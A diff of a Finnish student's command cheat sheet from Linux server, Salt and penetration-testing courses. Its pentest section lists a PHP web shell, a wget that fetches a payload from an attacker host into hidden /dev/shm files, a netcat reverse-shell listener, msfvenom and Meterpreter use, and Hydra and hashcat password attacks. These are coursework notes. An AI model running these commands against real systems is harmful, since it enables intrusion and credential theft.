@@ -1,7 +1,7 @@
 ________________________________________________________________________________________________________________________________
 
 Linux Palvelimet komentoja
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 *** ALKU KOMENNOT ***
 setxkbmap fi		<--->	Vaihtaa suomi nappaimiston
 sudo apt-get update	<--->	Tuo palvelimelle versio tiedot
@@ -10,11 +10,13 @@ uname -a		<--->	Kayttojarjestelman versio
 lshw -short -sanitize	<--->	Laitteisto
 ifconfig		<--->	Ip tietoja
 passwd			<--->	Salasana xubuntu live tikulle
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** WIRELESS ADAPTERIN ASENNUS ***
 iwconfig					<--->	Tietoja langatomasta adapterista	
 sudo apt-get install bcmwl-kernel-source	<--->	Lataa langatoman adapterin
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** KANSIOT LINUXIIN ***
 ls			<--->	Listaa hakemiston tiedostot
 ls -a			<--->	Listaa myos hidden folderit
@@ -37,7 +39,8 @@ man ls			<--->	Tuo terminaaliin ohjekirjan ls toiminnosta
 history			<--->	Nayttaa vanhat kommennot
 /var/log/auth.log	<--->	Kirjautumis loki kansio
 fg			<--->	Tuo ctrl+Z suljetun tiedoston takaisin
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** HAKUTOIMINTO *** 
 grep nimi		<--->	 Hakee tietueesta hakusanalla
 grep -ir		<--->	 Ir on textin luku ohjelma
@@ -46,14 +49,15 @@ tail tietueennimi -F	<--->	 Avaa tietueen 10viimeista rivia ja -F paivittaa tiet
 
 | putki merkki		<--->	 Liimataan komentoja 
 
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 *** TIEDOSTOJEN LATAUS ***
 sudo apt-get update			<--->	Paivittaa tamanhetkiset ohjelmisto versiot
 apt-cache search ohjelmannimi		<--->	Etsii ohjelmistoja
 sudo apt-get install ohjelmannimi	<--->	Asentaa ohjelmiston
 sudo apt-get remove ohjelmannimi	<--->	Poistaa ohjelmiston
 sudo apt-fer purge ojelmnnimi		<--->	Poistaa ohjelmiston ja asetukset
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** OHJELMIA ***
 sudo apt-get install	<--->	Turvallinen tapa asentaa ohjelmia
 shutter			<--->	Snappintool
@@ -68,12 +72,13 @@ apache2			<--->	Apache2
 sudo snap-install	<--->	 Ei niin turvallinen tapa asentaa ohjelmia
 Discord			<--->	 VoIP
 
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 *** LINUX PIKA NAPPAIN ***
 CTRL + C		<--->	Yleisesti sulkee ohjelmia
 WINDOWS + T		<--->	Avaa terminaalin
 WINDOWS + Z		<--->	Sammuttaa toimintoja ilde tilaan takaisin "fg"
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** APACHE, UFW PALOMUURI JA PHP ***
 sudo ufw enable					<--->	Palomuuri paalle, jos etayhteys paallä ssh yhteys voi katketa
 sudo ufw allow 22/tcp				<--->	Ssh paalle
@@ -101,7 +106,8 @@ sudoedit					<--->	Sudo kayttaja editori
 grep -i -r php					<--->	Hakee grep php
 <?php print(1+1)?>				<--->	Esimerkki php koodista jos HTML sivule tulee 2 php on paalle
 sudo ufw allow 22/tcp				<--->	Palomuuri auki portille 22/tcp
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** SSH ROOT JA KAYTTAJIEN LUONTI ***
 sudo apt-get install -y openssh-client openssh-server
 
@@ -121,7 +127,8 @@ sudo service ssh restart			<--->	SSH uudelleen käynnistys = asetukset tulee voi
 host dunttus.com dnsl.registrar-server.com	<--->	Talla voidaan katsoa hostin tietoja
 sudo a2ensite dunttus-com.conf			<--->	Lisaa tiedoston conf tiedostoon
 netstat	-tulpn					<--->	Avoin portti
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** JULKINEN JA SALAINEN AVAIN ***
 ssh-keygen			<--->	Luo julkisen ja salaisen avaimen
 ssh-copy-id joni@localhost	<--->	Kopioi local hostiin avaimen
@@ -130,7 +137,7 @@ Enter file in which to save the key (/home/xubuntu/.ssh/id_rsa):	<--->	Salainen 
 
 rsa.pub julkinen avain							<--->	Julkinen avain
 
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 *** TIEDONSIIRTO ***
 RSYNC
 rsync nimi.txt joni@dunttus.com:			<--->	Tekstin kopiointi
@@ -143,8 +150,7 @@ SSHFS
 sshfs user@104.248.26.65: kansio:			<--->   Graaffinen valikointi
 fusermount -u kansio					<--->   Irrottaa mount pointin
 
-
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ***PROSESSIEN ANALYSOINTI***
 top				<--->	Tietoja kuormituksesta
 uptime				<--->	Kurmituksen kehitys arvo
@@ -168,10 +174,11 @@ waux | grep -i xclock		<--->	prosessi numero
 kill 123prosessinumero123	<--->	tappaa prossessin numeron perusteella
 pstree -Up | less		<--->	prosessi puu
 
-hostname -l
+hostname -I			<--->	Oma ip osoite
 
 df -ah				<--->	Paljon disk tilaa jäljellä
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** SCRIPTIT ***
 echo "hei joni"			<--->	Kirjoitaa hei joni
 nano hei.sh			<--->	Luo scriptin
@@ -190,7 +197,8 @@ phython3 hei.py			<--->	Avaa phythonin tulkin
 CTRL+D				<--->	Sulkee phytonin
 print("heii")			<--->	Tulostaa heii
 HELLOWORLD KARVINEN java go ja c kielet
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** SSH PROXY ***
 hostname -I			<--->	Nayttaa ipn
 SOCK5				<--->	SSH proxy ominaisuuden nimi
@@ -199,16 +207,18 @@ nc -vz localhost 9080		<--->	Portin avaus nc=netcat
 Firefox				<--->	Firefox asetuksista manual proxy vain SOCKS host = localhost
 FoxyProxxy			<--->	Jos monta proxya
 
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** TMUX **
 tmux new -s name		<--->	Aloittaa tmuxin
 CTRL+b	+c			<--->	Prefix
 Prefix+ numero			<--->	vaihtaa sivun
 Prefix+d			<--->	Deletoi ikkunan
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** GOOGLE SCHOLAR ***
 settings			<--->	Kieli Englanti, library links Haaga-Helia
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** KÄYTTÄJÄT *** 
 jhakala tai joni		<--->	Esimerkki käytäjä, max 8merk, a-z, alkaa kirjaimella.
 pavahx6Ousoh			<--->	Hyvä alkusalasan on random ja kirjoitetaan muistiin. 
@@ -217,7 +227,8 @@ ls -ld salasanat.txt		<--->	Oikeudet
 chmod og-rwx salasanat.txt	<--->	Poistaa oikeudet read write execute
 sudo adduser joni		<--->	Luo käyttäjän joni
 pwgen 12 2			<--->	Generoi 12 merkkin salasanan 2 kertaa
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 *** MARIADB ***
 Asennus:
 sudo apt-get install mariadb-client mariadb-server
@@ -233,14 +244,13 @@ Pohjana Tero Karvinen 2012: Linux kurssi, http://terokarvinen.com
 
 
 
-*****************************************************************************************************
-*****************************************************************************************************
+********************************************************************************************************************************
+********************************************************************************************************************************
 
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 
 Palvelinten Hallinta komentoja
-_____________________________________________________________________________________________________
-
+________________________________________________________________________________________________________________________________
 ** SALT **
 sudo apt-get -y install salt-master     <--->   Asentaa salt masterin
 sudo apt-get -y install salt-minion     <--->   Asentaa salt orjan
@@ -280,12 +290,14 @@ sudo salt '*' sys.state_doc             <--->   Generoi documentin koneelle
 
 /var/lib/salt/pki/minion/minion_master.pub      <--->   Orja koneen kansiossa palvelimen julkinen avain
 nc -vz ip portti                                <--->   Yhden portin scannaus netcatilla
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 **FIND KOMENTO**
 sudo find -printf "%T+ %p\n"|sort			<--->   Kertoo asennetujne ohjelmien ajan jarjesteksyssa
 sudo find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort	<--->	Kertoo asennettujen ohjelmien ajan jarjestyksessa
 find /home -printf "%f\t%p\t%u\t%g\m\n" | column -t	<--->	Hakee home kansion kaikki tiedostot
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 **GIT VERSIO HALLINTA**
 git init nimi                           <--->   Alku kansion luonti paikkallisesti
 git add .                               <--->   Valmistaa kaikki tiedostot committia varten
@@ -306,7 +318,8 @@ git rm					<--->   Git poisto komento
 
 sudo git add .; sudo git commit -a -m "COMMENT"; sudo git pull; sudo git push
 sudo git add . && sudo git commit -a -m "COMMMENT" && sudo git pull && sudo git push
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** VirtualBox Vagrant **
 sudo apt-get install vagrant            <--->   Vagrantin asennus paketti
 sudo apt-get install virtualbox-qt      <--->   Virtualbox asennus paketti
@@ -315,7 +328,8 @@ vagrant init ubuntu/trusty64            <--->   Esimerkki joka luo ubuntun bento
 vagrant up                              <--->   Asentaa vagrantin Vagrantfilen avulla
 vagrant ssh                             <--->   Vagrant koneelle paasee ssh yhteydella
 vagrant destroy                         <--->   Tuhoaa vagrant koneen
-_____________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** SALT WINDOWS **
 salt-master --version                                   <--->   Linux herran Salt masterin versio
 sudo salt '*' cmd.run 'ipconfig' shell=powershell       <--->   Saltin kautta powershell komentoja
@@ -342,14 +356,15 @@ Pohjana Tero Karvinen 2012: Palvelinten hallinta kurssi, http://terokarvinen.com
 Window Salt repo 2019: https://docs.saltstack.com/en/latest/topics/windows/windows-package-manager.html
 
 
-*****************************************************************************************************
-*****************************************************************************************************
+********************************************************************************************************************************
+********************************************************************************************************************************
 
 !!! Penetration Testing kohdan käytetyt menetelmät ovat väärin käytettynä laittomia, käytä omalla vastuulla. !!!
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 
 Penetration Testing
-_____________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
+
 ** Muistio **
 
 Intrusion kill chain
@@ -372,7 +387,8 @@ pentestmonkey net reverse shell cheat sheet <---> tty
 censys
 shodan
 maltego
-________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** Pentest alkeet **
 rmmod pcspkr                                    <--->   Piip ääni pois kalista
 /dev/shm/.virus.sh				<--->	Hyvä ram kansio viiruksille
@@ -399,7 +415,7 @@ localhost:8080/WebGoat                          <--->   Selaimella
 
 echo "salasana"|sha256sum                       <--->   Salasana terminaaliin salattuna sha256
 
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** MitmProxy **
 EDITOR=nano mitmproxy -p 8888                   <--->   Mitmproxy nano editorilla portissa 8888
 localhost 8888                                  <--->   Manual HTTP proxy Firefox asetus ja 127 poistetaan
@@ -414,21 +430,22 @@ f                                               <--->   Filter expressions mitmp
 i                                               <--->   Intersept=nimi näppäin "a" eteen päin 1askel
 shift+a                                         <--->   Intercept tilassa päästä kaikki loput läpi
 
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** Gobuster **
 gobuster -u http://URL -w /usr/share/wordlist	<--->	Dir skannaus
 
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** SEARCHSPLOIT **
 uname -a					<--->	Linux versio komento
 searchsploit "app name"				<--->	Hakee tunnetuja haavoituvuuksia
 searchsploit -w "app name"			<--->	Tuo hakuun web sivun
 searchsploit -x id123.txt			<--->	Hakee lisätietoja IDn mukaan
-________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** DIRB skanneri **
 dirb http://10.10.10.1 -r -o			<--->	-r lippu no recursive ja -o tallentaa listan
 
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** WebGoat **
 POST ../../../../../WEB-INF/spring-security.xml <--->   Tehtävä bypass a path based access fire fox inspector
 POST action DeleteProfile                       <--->
@@ -452,10 +469,7 @@ Pass:___ Check password
 'select*from user_system_data--
 table name user_system_data
 
-
-Activate SUBMIT disabled -> enabled             <--->
-
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** Nmap **
 ip route
 ipcalc 10.0.0.0
@@ -472,7 +486,8 @@ nmap -n 10.10.10.1-254 -p 80,443        <--->   scannaa ip alueen portit 80 ja 4
 -Pn                                     <--->   no ping
 --top-ports 10                          <--->   Skanna 10 suosituinta porttia
 -sC					<--->	Scripti skannaus
-________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** MetaSploit **
 msfdb init              <--->   Ajetaan kerran
 msf                     <--->   Kaikki komennolt alkaa
@@ -491,13 +506,13 @@ msfpc|less --raw
 set                     <--->   Listaa RHOST maalit
 set RHOSTS 10.0.0.0     <--->   Yli ajaa RHOST tiedoston yhdellä maalilla
 
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** EyeWitness **
 eyewitness -f /root/ey/hosts            <--->   EyeWitness toiminto hosts tiedostoon tarvitaan domain tai ip
 --web --prepend-https                   <--->   Liput jotka hakee webbisivusta myös https
 hosts                                   <--->   Listataan kansioon hostnimi tai ip
 
-________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________
 ** Meterpreter **
 install metaspoit-framework                     <--->   Päivittää explotit metasploitiin
 vagrant rapid7                                  <--->   vagrant tiedoston nimi
@@ -528,7 +543,8 @@ MeterPreter: download /file/path		<--->	Lataa tiedostoja target koneesta
 MeterPreter: upload /file/path			<--->	Lataa tiedostoja target koneelle
 
 Portit pitää avata localkoneesta
-________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** HashCat **
 hashcat -m --force /root/hash/md5.txt /usr/share/wordlists/fasttrack.txt        <--->   hc md5 esim
 --show                                                                          <--->   Jos salasana jo crackatty
@@ -541,13 +557,15 @@ $6$                                                                             
 hashcat -m 1800 -a 0 '$6$'ifuhwapuifh sanalista                                 <--->   hc esim sha512
 man crypt                                                                       <--->   $6$ merkki salauksen tarkoitus
 s                                                                               <--->   Näkee eteenpäin scannauksen aikana
-________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** THCHydra **
 hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittää aravata tietyn käyytäjän salasanaa
 hydra -L loginuserfile                                          <--->   Kokeilee kaikilla käyttäjillä jotka sanalistassa
 systemctl restart ssh                                           <--->   Jos ei toimi restart
 hydra http form                                                 <--->   Googlesta löytää web formeihin esimerkkejä
-________________________________________________________________________________________________
+
+________________________________________________________________________________________________________________________________
 ** msfvenom **
 msfvenom --list payloads | grep -i linux        <--->   Hakee hyötykuormia
 msfvenom --list formats
@@ -563,18 +581,16 @@ exploit                                 <--->
 ./troyan                                <--->	
 fg					<--->	
 
-________________________________________________________________________________________________
-Reverse shell
+________________________________________________________________________________________________________________________________
+** Reverse shell **
 <?php echo system($_REQUEST['fun']); ?>	<--->	Koodin toimivuus testi
 ?fun=whoami				<--->	Selaimessa tiedoston peraan
 
-python -m SimpleHTTPServer 8000				<--->   Lataus serveri
-wget 10.10.10.10:8000/filename.php -O /dev/shm/.name.php <--->   Tiedoston lataus selaimella
+python -m SimpleHTTPServer 8000					<--->   Lataus serveri
+wget 10.10.10.10:8000/filename.php -O /dev/shm/.name.php	<--->   Tiedoston lataus selaimella
+nc -v -n -l -p 5005						<--->	Reverse shell omalle koneelle pentestmonkey php
 
-
-nc -v -n -l -p 5005			<--->	Reverse shell omalle koneelle pentestmonkey php
-
-
+________________________________________________________________________________________________________________________________
 
 
 Pohjana Tero Karvinen 2019: Penetration Testing kurssi, http://terokarvinen.com
